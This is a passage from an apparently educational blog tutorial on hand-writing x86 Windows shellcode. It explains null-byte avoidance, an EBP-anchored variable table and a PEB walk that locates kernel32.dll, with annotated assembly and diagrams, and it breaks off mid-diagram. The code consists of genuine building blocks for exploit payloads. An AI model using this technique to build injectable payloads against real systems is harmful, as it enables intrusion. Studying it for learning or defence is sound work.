---
title: "The Art of x86 Windows Shellcoding"
date: 2026-11-09 00:00:00 +0300
categories: [Exploit Development, Shellcoding]
tags: [x86, shellcoding, windows, assembly, exploit-development]
description: "A deep dive into crafting custom x86 Windows shellcode — every instruction explained, every API call visualized."
image:
  path: /assets/img/shellcoding/banner.svg
---

I always wondered what actually happens between the moment an exploit hijacks execution and the moment a shell pops on the attacker's screen. Not the Metasploit-generated blob — the actual instructions. The PEB walk, the hash loop, the struct built one DWORD at a time on the stack. So I sat down and wrote every payload from scratch, in raw x86 assembly, until the mystery was gone.

This is everything I learned. Every instruction is here, every API call is explained, and every concept has a diagram. No frameworks, no shortcuts — just you, the CPU, and the Windows API.

---

## 1. What Is Shellcode?

**Shellcode** is a small, self-contained block of machine code designed to be injected into a running process and executed directly. The name comes from its original purpose -- spawning a shell -- but modern shellcode can do anything: download files, add user accounts, open reverse connections, or disable security software.

What makes shellcode different from a normal compiled program?

- **No loader.** When Windows runs an `.exe`, the PE loader resolves imports, fixes up addresses, and sets up memory sections. Shellcode gets none of that. It lands in memory at an unpredictable address and must figure everything out itself.
- **No null bytes** (usually). Shellcode is often delivered through string-handling functions like `strcpy()` that stop at `0x00`. A single null byte truncates our payload. We must encode around them.
- **No hardcoded addresses.** DLLs load at different addresses thanks to ASLR. Shellcode must locate every API function it needs at runtime.

<div align="center"><svg viewBox="0 0 750 300" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s1"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00d4ff" stop-opacity="0.6"/><stop offset="100%" stop-color="#ff3366" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="300" rx="10" fill="url(#bg_s1)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s1)"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s1)">Normal EXE vs Shellcode</text>
  <!-- Normal EXE side -->
  <rect x="30" y="50" width="330" height="230" rx="8" fill="#151b28" stroke="#00d4ff" stroke-width="1.5" opacity="0.9"/>
  <text x="195" y="75" text-anchor="middle" fill="#00d4ff" font-size="14" font-weight="bold">Normal .exe</text>
  <rect x="50" y="90" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="111" text-anchor="middle" fill="#00ff88" font-size="11">PE Loader resolves all imports</text>
  <rect x="50" y="130" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="151" text-anchor="middle" fill="#00ff88" font-size="11">Fixed base address (rebased by ASLR)</text>
  <rect x="50" y="170" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="191" text-anchor="middle" fill="#00ff88" font-size="11">IAT provides function pointers</text>
  <rect x="50" y="210" width="290" height="32" rx="5" fill="#0d1117" stroke="#00ff88" stroke-width="0.8"/>
  <text x="195" y="231" text-anchor="middle" fill="#00ff88" font-size="11">Sections: .text, .data, .rdata mapped</text>
  <text x="195" y="265" text-anchor="middle" fill="#8b949e" font-size="11">Everything set up before main() runs</text>
  <!-- Shellcode side -->
  <rect x="390" y="50" width="330" height="230" rx="8" fill="#151b28" stroke="#ff3366" stroke-width="1.5" opacity="0.9"/>
  <text x="555" y="75" text-anchor="middle" fill="#ff3366" font-size="14" font-weight="bold">Shellcode</text>
  <rect x="410" y="90" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="111" text-anchor="middle" fill="#ff3366" font-size="11">Must find every API at runtime</text>
  <rect x="410" y="130" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="151" text-anchor="middle" fill="#ff3366" font-size="11">Lands at unknown address (PIC)</text>
  <rect x="410" y="170" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="191" text-anchor="middle" fill="#ff3366" font-size="11">Walks PEB + parses PE exports</text>
  <rect x="410" y="210" width="290" height="32" rx="5" fill="#0d1117" stroke="#ff3366" stroke-width="0.8"/>
  <text x="555" y="231" text-anchor="middle" fill="#ff3366" font-size="11">No sections -- raw bytes in memory</text>
  <text x="555" y="265" text-anchor="middle" fill="#8b949e" font-size="11">Must bootstrap everything itself</text>
</svg></div>

This last point is critical. Our shellcode must be **position-independent code (PIC)** -- it works regardless of where in memory it lands. Every address we need, we compute on the fly.

### x86 Primer: The Registers We Care About

Before we dive into assembly, let's establish the registers we will use constantly throughout this series.

**General-purpose registers:**

| Register | Conventional Use | Our Use |
|----------|-----------------|---------|
| **EAX** | Return values, accumulator | Function return values, scratch math |
| **EBX** | Base register (callee-saved) | DLL base addresses |
| **ECX** | Counter for loops | Loop counters, string lengths |
| **EDX** | Data, I/O operations | Hash accumulator, scratch |
| **ESI** | Source index for string ops | Source pointers, PEB traversal |
| **EDI** | Destination index | Destination pointers, PE table pointers |
| **EBP** | Base/frame pointer | **Our variable table** (key design choice) |
| **ESP** | Stack pointer | Top of stack (grows downward) |

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s2" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s2"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s2)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s2)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s2)">x86 Register Map for Shellcode</text>
  <!-- Data registers -->
  <text x="60" y="55" fill="#00d4ff" font-size="12" font-weight="bold">Data Registers</text>
  <rect x="30" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="40" y="82" fill="#00ff88" font-size="12" font-weight="bold">EAX</text>
  <text x="100" y="95" fill="#e0e7ff" font-size="10">return values</text>
  <rect x="200" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="210" y="82" fill="#ff6b35" font-size="12" font-weight="bold">EBX</text>
  <text x="270" y="95" fill="#e0e7ff" font-size="10">DLL base addr</text>
  <rect x="370" y="65" width="160" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="380" y="82" fill="#00d4ff" font-size="12" font-weight="bold">ECX</text>
  <text x="440" y="95" fill="#e0e7ff" font-size="10">loop counter</text>
  <rect x="540" y="65" width="180" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="550" y="82" fill="#00d4ff" font-size="12" font-weight="bold">EDX</text>
  <text x="620" y="95" fill="#e0e7ff" font-size="10">hash accumulator</text>
  <!-- Index registers -->
  <text x="60" y="130" fill="#00d4ff" font-size="12" font-weight="bold">Index Registers</text>
  <rect x="30" y="140" width="220" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="40" y="157" fill="#00d4ff" font-size="12" font-weight="bold">ESI</text>
  <text x="120" y="170" fill="#e0e7ff" font-size="10">source ptr / PEB walk</text>
  <rect x="270" y="140" width="220" height="38" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.2"/>
  <text x="280" y="157" fill="#00d4ff" font-size="12" font-weight="bold">EDI</text>
  <text x="360" y="170" fill="#e0e7ff" font-size="10">dest ptr / PE tables</text>
  <!-- Special registers -->
  <text x="60" y="205" fill="#ff3366" font-size="12" font-weight="bold">Critical Registers</text>
  <rect x="30" y="215" width="330" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="40" y="235" fill="#ff3366" font-size="13" font-weight="bold">EBP</text>
  <text x="90" y="235" fill="#e0e7ff" font-size="12">= our VARIABLE TABLE</text>
  <text x="90" y="255" fill="#8b949e" font-size="10">[ebp+N] stores resolved API addresses</text>
  <rect x="390" y="215" width="330" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="400" y="235" fill="#ff3366" font-size="13" font-weight="bold">ESP</text>
  <text x="450" y="235" fill="#e0e7ff" font-size="12">= stack pointer (grows DOWN)</text>
  <text x="450" y="255" fill="#8b949e" font-size="10">push decrements, pop increments</text>
  <!-- stdcall box -->
  <rect x="30" y="278" width="690" height="30" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="298" text-anchor="middle" fill="#ff6b35" font-size="11">stdcall: push args right-to-left, callee cleans stack, return value in EAX</text>
</svg></div>

> **Key concept:** The x86 stack grows *downward* in memory. `push eax` decrements ESP by 4, then writes EAX at the new ESP. `pop eax` reads from ESP, then increments by 4.

**Calling convention (cdecl/stdcall):** Windows API functions use **stdcall** -- arguments are pushed onto the stack right-to-left, the callee cleans up the stack, and the return value lands in EAX. So to call `SomeFunction(arg1, arg2, arg3)`, we push `arg3`, then `arg2`, then `arg1`, then `call`.

With those fundamentals in place, let's build the skeleton that every piece of our shellcode will hang from.

---

## 2. The Shellcode Skeleton

Every shellcode we write in this series starts with the same two instructions. They look simple, but the reasoning behind them is worth understanding fully.

```nasm
start:
    mov   ebp, esp          ; Anchor our variable table
    add   esp, 0xfffff9f0   ; Carve out stack space (null-free)
```

### Anchoring EBP as Our Variable Table

The first instruction, `mov ebp, esp`, captures the current top of the stack into EBP. From this point forward, **EBP becomes our fixed reference point** -- a personal variable table where we store every resolved API address and piece of data we need.

Why EBP? Because in normal compiled code, EBP is the frame pointer -- it points to a stable location in the stack frame while ESP moves around with every push and pop. We exploit that same stability. No matter how much we push and pop during execution, EBP never moves.

Our variable table layout:

| Offset | Contents |
|--------|----------|
| `[ebp+0x04]` | Address of `find_function` (our API resolver) |
| `[ebp+0x08]` | Resolved address of first API (e.g., `LoadLibraryA`) |
| `[ebp+0x0C]` | Resolved address of second API (e.g., `CreateProcessA`) |
| `[ebp+0x10]` | Resolved address of third API (e.g., `ExitProcess`) |
| `[ebp+0x14]` | ... and so on for every API we need |

We simply `mov [ebp+0x08], eax` after resolving an API, and later `call dword ptr [ebp+0x08]` to invoke it. Clean, predictable, and easy to extend.

### Carving Stack Space Without Null Bytes

The second instruction is where things get clever:

```nasm
add   esp, 0xfffff9f0   ; ESP = ESP - 0x610 (1552 bytes)
```

Wait -- we are *adding* to ESP to move it *down*? Yes. Let's work through the math.

We want to subtract `0x610` (1552 decimal) from ESP to reserve stack space. But `sub esp, 0x610` would assemble with null bytes in the immediate value (`0x00000610`). Those nulls would kill our shellcode in most injection scenarios.

Instead, we use **two's complement arithmetic**. The two's complement of `0x610` is:

```
0x00000610  -->  NOT  -->  0xFFFFF9EF  -->  +1  -->  0xFFFFF9F0
```

<div align="center"><svg viewBox="0 0 750 220" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s3" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s3"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="tc-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="220" rx="10" fill="url(#bg_s3)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s3)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold" filter="url(#glow_s3)">Two's Complement: Turning SUB into ADD</text>
  <!-- Step 1: original value -->
  <rect x="30" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="105" y="75" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">0x00000610</text>
  <text x="105" y="98" text-anchor="middle" fill="#8b949e" font-size="10">has null bytes!</text>
  <!-- Arrow 1 -->
  <line x1="180" y1="82" x2="220" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="200" y="72" text-anchor="middle" fill="#00ff88" font-size="10">NOT</text>
  <!-- Step 2: NOT -->
  <rect x="225" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="300" y="75" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">0xFFFFF9EF</text>
  <text x="300" y="98" text-anchor="middle" fill="#8b949e" font-size="10">bitwise invert</text>
  <!-- Arrow 2 -->
  <line x1="375" y1="82" x2="415" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="395" y="72" text-anchor="middle" fill="#00ff88" font-size="10">+1</text>
  <!-- Step 3: +1 -->
  <rect x="420" y="55" width="150" height="55" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2.5"/>
  <text x="495" y="75" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">0xFFFFF9F0</text>
  <text x="495" y="98" text-anchor="middle" fill="#00ff88" font-size="10">no null bytes!</text>
  <!-- Arrow 3 -->
  <line x1="570" y1="82" x2="610" y2="82" stroke="#00ff88" stroke-width="2" marker-end="url(#tc-arr)"/>
  <text x="590" y="72" text-anchor="middle" fill="#00ff88" font-size="10">USE</text>
  <!-- Result -->
  <rect x="615" y="50" width="110" height="65" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="670" y="72" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">add esp,</text>
  <text x="670" y="90" text-anchor="middle" fill="#00d4ff" font-size="10" font-weight="bold">0xFFFFF9F0</text>
  <text x="670" y="108" text-anchor="middle" fill="#e0e7ff" font-size="9">= esp - 0x610</text>
  <!-- Bottom explanation -->
  <rect x="80" y="135" width="590" height="65" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1" stroke-dasharray="4,4"/>
  <text x="375" y="158" text-anchor="middle" fill="#e0e7ff" font-size="12">In 32-bit arithmetic: 0xFFFFF9F0 = -0x610</text>
  <text x="375" y="178" text-anchor="middle" fill="#00ff88" font-size="12">ESP + (-0x610) = ESP - 0x610</text>
  <text x="375" y="193" text-anchor="middle" fill="#8b949e" font-size="10">The CPU does not distinguish signed from unsigned -- it just adds bits</text>
</svg></div>

So `0xFFFFF9F0` is the two's complement representation of `-0x610`. Adding a negative number is the same as subtracting the positive:

```
ESP + 0xFFFFF9F0 = ESP - 0x610
```

The value `0xFFFFF9F0` contains no null bytes. Problem solved.

> **Why 1552 bytes?** Our shellcode will push structures onto the stack -- `STARTUPINFOA` (68 bytes), `PROCESS_INFORMATION` (16 bytes), `WSADATA` (400 bytes), `sockaddr_in` (16 bytes), plus all the API arguments. 1552 bytes gives us comfortable room without being wasteful. In constrained environments, you can tune this down.

### Visualizing the Stack Layout

Here is how memory looks after these two instructions execute:

<div align="center"><svg viewBox="0 0 750 480" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="arrowDown" markerWidth="10" markerHeight="7" refX="5" refY="7" orient="auto">
      <polygon points="0,0 10,0 5,7" fill="#00ff88"/>
    </marker>
    <marker id="arrowRight" markerWidth="7" markerHeight="10" refX="7" refY="5" orient="auto">
      <polygon points="0,0 7,5 0,10" fill="#00d4ff"/>
    </marker>
    <marker id="arrowLeft" markerWidth="7" markerHeight="10" refX="0" refY="5" orient="auto">
      <polygon points="7,0 0,5 7,10" fill="#00d4ff"/>
    </marker>
  </defs>
  <rect width="750" height="480" rx="10" fill="#0a0e17"/>
  <text x="375" y="30" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Stack Layout After Skeleton Setup</text>
  <text x="60" y="55" fill="#8b949e" font-size="11">HIGH MEMORY</text>
  <rect x="180" y="70" width="320" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="95" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">EBP (original ESP)</text>
  <rect x="180" y="115" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="136" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x04] = find_function addr</text>
  <rect x="180" y="150" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="171" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x08] = LoadLibraryA</text>
  <rect x="180" y="185" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="206" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x0C] = CreateProcessA</text>
  <rect x="180" y="220" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="241" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x10] = ExitProcess</text>
  <rect x="180" y="255" width="320" height="32" rx="4" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="340" y="276" text-anchor="middle" fill="#e0e7ff" font-size="12">[ebp+0x14] ... more APIs ...</text>
  <rect x="180" y="295" width="320" height="100" rx="4" fill="#151b28" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="6,3"/>
  <text x="340" y="340" text-anchor="middle" fill="#00ff88" font-size="13">~1552 bytes free space</text>
  <text x="340" y="360" text-anchor="middle" fill="#8b949e" font-size="11">(structures, arguments, strings)</text>
  <rect x="180" y="400" width="320" height="40" rx="4" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="340" y="425" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">ESP (after add esp, 0xfffff9f0)</text>
  <text x="60" y="455" fill="#8b949e" font-size="11">LOW MEMORY</text>
  <text x="550" y="93" fill="#ff3366" font-size="12">EBP --></text>
  <text x="550" y="423" fill="#ff3366" font-size="12">ESP --></text>
  <line x1="140" y1="90" x2="140" y2="420" stroke="#00ff88" stroke-width="2" marker-end="url(#arrowDown)"/>
  <text x="70" y="260" fill="#00ff88" font-size="11" text-anchor="middle" transform="rotate(-90, 70, 260)">0x610 bytes</text>
  <text x="670" y="250" fill="#8b949e" font-size="11" transform="rotate(90, 670, 250)">Stack grows down</text>
</svg></div>

*Figure 2.1 - The shellcode skeleton creates a fixed variable table at EBP and reserves 1552 bytes of working space below it. Positive offsets from EBP store resolved API addresses; the free space below holds structures and arguments during API calls.*

This two-instruction skeleton is the foundation we will never change. Everything else builds on top of it.

---

## 3. Walking the PEB: Finding kernel32.dll

Our shellcode needs to call Windows API functions like `LoadLibraryA`, `CreateProcessA`, and `WSAStartup`. But where are they? They live in DLLs, and DLLs load at unpredictable addresses. So the first thing we must do is find the base address of **kernel32.dll** -- the DLL that exports the most essential Windows APIs.

Windows gives us a way in: the **Process Environment Block (PEB)**. Every running process has one, and it contains a linked list of every loaded module (DLL) along with their base addresses. Better yet, access to the PEB requires no API calls at all -- it is reachable through a segment register.

### The Chain: TEB to PEB to Modules

Here is the chain we follow:

<div align="center"><svg viewBox="0 0 750 160" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <marker id="peb-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
  </defs>
  <rect width="750" height="160" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">The PEB Walk: 4 Steps to kernel32.dll</text>
  <!-- Step 1 -->
  <rect x="20" y="55" width="140" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="90" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">1</text>
  <text x="90" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">FS:[0x30]</text>
  <text x="90" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">TEB has PEB ptr</text>
  <text x="90" y="127" text-anchor="middle" fill="#8b949e" font-size="9">xor ecx,ecx</text>
  <!-- Arrow -->
  <line x1="160" y1="90" x2="190" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 2 -->
  <rect x="195" y="55" width="140" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="265" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">2</text>
  <text x="265" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">PEB+0x0C</text>
  <text x="265" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">PEB_LDR_DATA</text>
  <text x="265" y="127" text-anchor="middle" fill="#8b949e" font-size="9">loader tables</text>
  <!-- Arrow -->
  <line x1="335" y1="90" x2="365" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 3 -->
  <rect x="370" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="450" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">3</text>
  <text x="450" y="93" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">LDR+0x1C</text>
  <text x="450" y="110" text-anchor="middle" fill="#e0e7ff" font-size="10">InInitOrder list</text>
  <text x="450" y="127" text-anchor="middle" fill="#8b949e" font-size="9">linked list of DLLs</text>
  <!-- Arrow -->
  <line x1="530" y1="90" x2="560" y2="90" stroke="#00ff88" stroke-width="2" marker-end="url(#peb-arr)"/>
  <!-- Step 4 -->
  <rect x="565" y="55" width="160" height="80" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2.5"/>
  <text x="645" y="73" text-anchor="middle" fill="#00ff88" font-size="18" font-weight="bold">4</text>
  <text x="645" y="93" text-anchor="middle" fill="#ff3366" font-size="12" font-weight="bold">Entry+0x08</text>
  <text x="645" y="110" text-anchor="middle" fill="#ff3366" font-size="10">Base Address!</text>
  <text x="645" y="127" text-anchor="middle" fill="#00ff88" font-size="9">EBX = kernel32 base</text>
</svg></div>

1. **Thread Environment Block (TEB):** On x86 Windows, the `FS` segment register always points to the TEB of the current thread. At offset `0x30` within the TEB sits a pointer to the PEB.

2. **PEB (Process Environment Block):** At offset `0x0C` within the PEB sits a pointer to `PEB_LDR_DATA` -- the loader data structure.

3. **PEB_LDR_DATA:** This structure contains three doubly-linked lists of loaded modules, each ordered differently:
   - `InLoadOrderModuleList` (offset `0x0C`) -- order they were loaded
   - `InMemoryOrderModuleList` (offset `0x14`) -- order in memory
   - `InInitializationOrderModuleList` (offset `0x1C`) -- order they were initialized

4. **Module entries:** Each node in the list is an `LDR_DATA_TABLE_ENTRY`. From the entry we can read the DLL base address and its name.

> **Which list should we use?** Both `InInitializationOrderModuleList` (offset `0x1C`) and `InMemoryOrderModuleList` (offset `0x14`) work. The initialization-order list typically gives us: ntdll.dll first, then kernelbase.dll (on modern Windows), then kernel32.dll. The code below uses the initialization-order list; the offsets for base address and module name differ between the two lists, so pay attention to which one your code targets.

### The Assembly

```nasm
find_kernel32:
    xor   ecx, ecx              ; ECX = 0 (also clears for later cmp)
    mov   esi, fs:[ecx+0x30]    ; ESI = PEB address (TEB->PEB at offset 0x30)
    mov   esi, [esi+0x0C]       ; ESI = PEB->Ldr (PEB_LDR_DATA)
    mov   esi, [esi+0x1C]       ; ESI = Ldr->InInitializationOrderModuleList

next_module:
    mov   ebx, [esi+0x08]       ; EBX = module base address
    mov   edi, [esi+0x20]       ; EDI = pointer to module name (Unicode)
    mov   esi, [esi]            ; ESI = Flink (next entry in the list)
    cmp   [edi+12*2], cx        ; Is the 13th Unicode char null?
    jne   next_module           ; No -- try the next module
```

Let's walk through every instruction.

**`xor ecx, ecx`** -- We zero out ECX. Why not `mov ecx, 0`? Because that assembles as `B9 00 00 00 00` -- four null bytes. `xor ecx, ecx` assembles as `31 C9` -- two bytes, no nulls. We will also reuse the zero in CX for the string comparison later.

**`mov esi, fs:[ecx+0x30]`** -- This reads the PEB pointer from the TEB. We write `fs:[ecx+0x30]` instead of `fs:[0x30]` because some assemblers encode a bare `fs:[0x30]` with a null-containing displacement. Using `ecx+0x30` (where ECX is zero) avoids that.

**`mov esi, [esi+0x0C]`** -- We dereference the PEB to get `PEB_LDR_DATA`. The `Ldr` field is at offset `0x0C` within the PEB.

**`mov esi, [esi+0x1C]`** -- We follow the `InInitializationOrderModuleList` head pointer at offset `0x1C` within `PEB_LDR_DATA`. ESI now points to the first entry in the linked list.

**`mov ebx, [esi+0x08]`** -- From the current list entry, we grab the base address of the loaded module. For `InInitializationOrderModuleList`, the base address lives at offset `0x08`.

**`mov edi, [esi+0x20]`** -- We grab the pointer to the module's name string (Unicode, UTF-16LE). This is at offset `0x20` from the list entry.

**`mov esi, [esi]`** -- We advance ESI to the next entry in the linked list (the Flink pointer is at offset `0x00`). We do this *before* the comparison because if this module is not kernel32.dll, we need ESI already pointing to the next entry.

**`cmp [edi+12*2], cx`** -- Here is the identification trick. The string `kernel32.dll` has exactly 12 characters. In Unicode (UTF-16LE), each character is 2 bytes, so the 13th character (index 12) is at byte offset `12 * 2 = 24`. For `kernel32.dll`, that 13th character is the null terminator (`0x0000`). CX is still zero from our earlier `xor ecx, ecx`, so this comparison checks: "Does this module name have exactly 12 characters?" That uniquely identifies `kernel32.dll` among the typically loaded modules.

<div align="center"><svg viewBox="0 0 750 200" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <rect width="750" height="200" rx="10" fill="#0a0e17"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" font-weight="bold">Unicode String Layout: "kernel32.dll"</text>
  <text x="40" y="55" fill="#8b949e" font-size="10">Byte offset:</text>
  <!-- Byte offset numbers -->
  <text x="105" y="55" fill="#8b949e" font-size="9" text-anchor="middle">0</text>
  <text x="131" y="55" fill="#8b949e" font-size="9" text-anchor="middle">2</text>
  <text x="157" y="55" fill="#8b949e" font-size="9" text-anchor="middle">4</text>
  <text x="183" y="55" fill="#8b949e" font-size="9" text-anchor="middle">6</text>
  <text x="209" y="55" fill="#8b949e" font-size="9" text-anchor="middle">8</text>
  <text x="235" y="55" fill="#8b949e" font-size="9" text-anchor="middle">10</text>
  <text x="261" y="55" fill="#8b949e" font-size="9" text-anchor="middle">12</text>
  <text x="287" y="55" fill="#8b949e" font-size="9" text-anchor="middle">14</text>
  <text x="313" y="55" fill="#8b949e" font-size="9" text-anchor="middle">16</text>
  <text x="339" y="55" fill="#8b949e" font-size="9" text-anchor="middle">18</text>
  <text x="365" y="55" fill="#8b949e" font-size="9" text-anchor="middle">20</text>
  <text x="391" y="55" fill="#8b949e" font-size="9" text-anchor="middle">22</text>
  <text x="417" y="55" fill="#ff3366" font-size="9" text-anchor="middle" font-weight="bold">24</text>
  <!-- Character cells -->
  <rect x="92" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="105" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">k</text>
  <rect x="118" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="131" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">e</text>
  <rect x="144" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="157" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">r</text>
  <rect x="170" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="183" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">n</text>
  <rect x="196" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="209" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">e</text>
  <rect x="222" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="235" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">l</text>
  <rect x="248" y="62" width="26" height="30" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="261" y="82" text-anchor="middle" fill="#e0e7ff" font-size="11">3</text>
